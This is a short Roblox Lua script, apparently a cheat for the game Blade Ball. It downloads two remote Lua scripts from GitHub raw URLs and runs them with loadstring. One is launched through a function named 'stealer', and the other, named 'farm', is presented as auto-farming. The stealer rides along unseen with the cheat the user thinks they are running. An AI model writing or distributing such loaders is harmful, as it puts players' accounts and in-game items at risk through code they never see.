local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/bladeball/refs/heads/main/script.lua",true))()
end
local function farm()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kidshop4/scriptbladeballk/main/bladeball.lua",true))()
end

task.spawn(stealer)
task.spawn(farm)
